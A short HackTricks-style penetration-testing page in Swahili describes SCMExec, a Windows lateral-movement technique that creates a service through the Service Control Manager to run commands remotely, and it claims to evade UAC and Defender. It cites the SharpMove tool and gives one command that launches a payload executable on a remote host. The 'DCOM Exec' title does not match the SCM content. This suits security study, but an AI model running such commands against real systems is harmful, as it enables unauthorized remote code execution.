# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** ni technique ya kutekeleza commands kwenye mifumo ya mbali kwa kutumia Service Control Manager (SCM) kuunda service inayoendesha command. Mbinu hii inaweza kupita baadhi ya security controls, kama User Account Control (UAC) na Windows Defender.

## Zana

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Marejeo

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
